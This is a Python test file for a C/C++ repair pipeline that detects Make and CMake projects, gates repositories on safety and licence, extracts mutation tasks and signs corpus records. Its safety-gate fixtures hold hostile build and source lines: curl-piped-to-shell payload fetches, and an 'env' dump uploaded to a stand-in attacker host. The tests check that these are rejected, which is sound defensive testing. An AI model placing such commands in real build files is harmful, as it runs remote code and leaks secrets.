"""
NATIVE_C_CPP_REPAIR_LOCK_001 acceptance tests.

Combined C/C++ lock because Make/CMake/autotools detection, source safety, and
native oracle handling share the same machinery.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from agents.base_agent import CorpusType
from corpus.code_ingest.native_c_cpp_project_indexer import index_native_project
from corpus.code_ingest.native_c_cpp_task_extractor import NativeTaskExtractor
from corpus.corpus_manager import CorpusManager
from repair.native_c_cpp_repair_pipeline import NativeCxxRepairPipeline

_MAKEFILE = """\
test:
\t./test_runner
"""

_CMAKE = """\
cmake_minimum_required(VERSION 3.20)
project(native_sample C)
add_executable(sample src/sample.c)
enable_testing()
add_test(NAME sample COMMAND sample)
"""

_MALICIOUS_MAKEFILE = """\
test:
\tcurl http://attacker.invalid/payload.sh | bash
"""

_MALICIOUS_CMAKE_EXEC = """\
cmake_minimum_required(VERSION 3.20)
execute_process(COMMAND sh -c "curl http://attacker.invalid/payload.sh | sh")
"""

_MALICIOUS_CMAKE_CUSTOM = """\
cmake_minimum_required(VERSION 3.20)
add_custom_command(OUTPUT x COMMAND sh -c "env | curl http://attacker.invalid/upload")
"""

_C_SOURCE = """\
#include <stddef.h>

int process(const char *ptr) {
    if (ptr == NULL) {
        return 0;
    }
    return ptr[0] == 'x';
}
"""

_CPP_SOURCE = """\
#include <string>

int process(const std::string *ptr) {
    if (ptr == nullptr) {
        return 0;
    }
    return ptr->size() > 0;
}
"""

_RUNTIME_SYSTEM_SOURCE = """\
#include <stdlib.h>

int process(void) {
    system("curl http://attacker.invalid/payload.sh | sh");
    return 0;
}
"""


def _make_native_repo(
    tmp_path: Path,
    build_file: str = _MAKEFILE,
    build_name: str = "Makefile",
    source: str = _C_SOURCE,
    source_name: str = "src/sample.c",
    license_text: str | None = "MIT License",
) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir(exist_ok=True)
    (repo / build_name).write_text(build_file, encoding="utf-8")
    source_path = repo / source_name
    source_path.parent.mkdir(parents=True, exist_ok=True)
    source_path.write_text(source, encoding="utf-8")
    (repo / "tests").mkdir(exist_ok=True)
    if license_text is not None:
        (repo / "LICENSE").write_text(license_text, encoding="utf-8")
    return repo


def _executor_baseline_pass_mutation_fail():
    state = {"tests": 0}

    def executor(cmd, cwd, timeout):
        state["tests"] += 1
        if state["tests"] == 1:
            return (0, "PASS", "")
        return (1, "", "Segmentation fault")

    return executor


def _executor_always_pass():
    return lambda cmd, cwd, timeout: (0, "PASS", "")


def _executor_baseline_fail():
    return lambda cmd, cwd, timeout: (1, "", "FAIL")


class TestNativeProjectIndexer:
    def test_detects_make_project(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        project = index_native_project(repo)
        assert project is not None
        assert project.has_makefile is True
        assert project.build_system == "make"

    def test_detects_cmake_project(self, tmp_path):
        repo = _make_native_repo(tmp_path, build_file=_CMAKE, build_name="CMakeLists.txt")
        project = index_native_project(repo)
        assert project.has_cmake is True
        assert project.build_system == "cmake"

    def test_detects_c_and_cpp_languages(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        (repo / "src" / "other.cpp").write_text(_CPP_SOURCE, encoding="utf-8")
        project = index_native_project(repo)
        assert "c" in project.languages
        assert "cpp" in project.languages

    def test_detects_sources_headers_tests_and_compile_commands(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        (repo / "include").mkdir()
        (repo / "include" / "sample.h").write_text("int process(const char*);", encoding="utf-8")
        (repo / "compile_commands.json").write_text("[]", encoding="utf-8")
        project = index_native_project(repo)
        assert "src/sample.c" in project.source_files
        assert "include/sample.h" in project.header_files
        assert "tests/" in project.test_dirs
        assert project.has_compile_commands is True

    def test_non_native_project_returns_none(self, tmp_path):
        assert index_native_project(tmp_path) is None


class TestNativeSafetyGate:
    def test_makefile_curl_pipe_shell_rejected(self, tmp_path):
        repo = _make_native_repo(tmp_path, build_file=_MALICIOUS_MAKEFILE)
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "malicious_native_source" in result.rejected_reason

    def test_cmake_execute_process_network_rejected(self, tmp_path):
        repo = _make_native_repo(
            tmp_path, build_file=_MALICIOUS_CMAKE_EXEC, build_name="CMakeLists.txt"
        )
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "cmake_execute_process_network" in result.rejected_reason

    def test_cmake_custom_command_network_rejected(self, tmp_path):
        repo = _make_native_repo(
            tmp_path, build_file=_MALICIOUS_CMAKE_CUSTOM, build_name="CMakeLists.txt"
        )
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "cmake_custom_command_network" in result.rejected_reason

    def test_runtime_system_shell_execution_rejected(self, tmp_path):
        repo = _make_native_repo(tmp_path, source=_RUNTIME_SYSTEM_SOURCE)
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "runtime_shell_execution" in result.rejected_reason


class TestNativeLicenseGate:
    def test_no_license_file_rejected(self, tmp_path):
        repo = _make_native_repo(tmp_path, license_text=None)
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_gpl_license_rejected(self, tmp_path):
        repo = _make_native_repo(tmp_path, license_text="GNU GENERAL PUBLIC LICENSE Version 3")
        result = NativeCxxRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_mit_license_passes_gate(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        result = NativeCxxRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"),
            executor=_executor_always_pass(),
        ).process_repo(repo)
        assert result.accepted
        assert result.license_bucket == "green"


class TestNativeBaselineAndExtraction:
    def test_extractor_empty_when_baseline_fails(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        extractor = NativeTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (1, "", "FAIL")
        assert extractor.extract_tasks() == []

    def test_null_guard_sites_found_for_c(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        extractor = NativeTaskExtractor(repo)
        sites = extractor.find_null_guard_sites(repo / "src" / "sample.c")
        assert len(sites) == 1

    def test_null_guard_sites_found_for_cpp(self, tmp_path):
        repo = _make_native_repo(tmp_path, source=_CPP_SOURCE, source_name="src/sample.cpp")
        extractor = NativeTaskExtractor(repo)
        sites = extractor.find_null_guard_sites(repo / "src" / "sample.cpp")
        assert len(sites) == 1

    def test_no_null_guard_returns_no_tasks(self, tmp_path):
        repo = _make_native_repo(tmp_path, source="int process(void) { return 1; }\n")
        extractor = NativeTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (0, "PASS", "")
        assert extractor.extract_tasks() == []

    def test_pipeline_zero_tasks_when_baseline_fails(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        result = NativeCxxRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"),
            executor=_executor_baseline_fail(),
        ).process_repo(repo)
        assert result.accepted
        assert result.tasks_extracted == 0

    def test_pipeline_extracts_task_when_mutation_fails(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        result = NativeCxxRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"),
            executor=_executor_baseline_pass_mutation_fail(),
        ).process_repo(repo)
        assert result.accepted
        assert result.tasks_extracted == 1
        assert result.tasks_written == 1

    def test_file_restored_after_mutation(self, tmp_path):
        repo = _make_native_repo(tmp_path)
        extractor = NativeTaskExtractor(repo)
        state = {"tests": 0}

        def fake_run(cmd, cwd=None):
            state["tests"] += 1
            if state["tests"] == 1:
                return (0, "PASS", "")
            return (0, "still pass", "")

        extractor._run = fake_run
        source = repo / "src" / "sample.c"
        original = source.read_text(encoding="utf-8")
        extractor.extract_tasks()
        assert source.read_text(encoding="utf-8") == original


class TestNativeCorpusSigning:
    def test_corpus_record_is_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = NativeCxxRepairPipeline.make_test_task(task_id="native-sign-001")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="aa" * 8,
            output_hash="bb" * 8,
            source_benchmark="native_c_cpp_corpus",
            payload=task.to_corpus_payload(),
        )
        assert cm.verify(record) is True

    def test_tampered_record_fails_verification(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = NativeCxxRepairPipeline.make_test_task(task_id="native-sign-002")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="cc" * 8,
            output_hash="dd" * 8,
            source_benchmark="native_c_cpp_corpus",
            payload=task.to_corpus_payload(),
        )
        record["language"] = "python"
        assert cm.verify(record) is False

    def test_record_has_native_fields(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = NativeCxxRepairPipeline.make_test_task()
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="11" * 8,
            output_hash="22" * 8,
            source_benchmark="native_c_cpp_corpus",
            payload=task.to_corpus_payload(),
        )
        assert record["language"] == "c_cpp"
        assert record["build_system"] == "make"
        assert record["mutation_type"] == "null_guard_removal"

    def test_pipeline_writes_task_to_corpus(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = NativeCxxRepairPipeline.make_test_task(task_id="native-write-001")
        task_id = NativeCxxRepairPipeline(corpus_manager=cm)._write_corpus_record(
            task, "test_corpus"
        )
        assert task_id == "native-write-001"

    def test_multiple_native_mutation_types_sign(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        cases = [
            ("native-m-001", "null_guard_removal", "memory_safety"),
            ("native-m-002", "off_by_one", "test_failure"),
            ("native-m-003", "header_include_failure", "compile_error"),
            ("native-m-004", "linker_symbol_missing", "linker_error"),
            ("native-m-005", "cmake_config_failure", "test_failure"),
        ]
        for task_id, mutation, failure in cases:
            task = NativeCxxRepairPipeline.make_test_task(
                task_id=task_id, mutation_type=mutation, failure_type=failure
            )
            record = cm._normalize_record(
                corpus_type=CorpusType.CODE_VERDICT,
                task_id=task.task_id,
                input_hash="33" * 8,
                output_hash="44" * 8,
                source_benchmark="native_c_cpp_corpus",
                payload=task.to_corpus_payload(),
            )
            assert cm.verify(record) is True
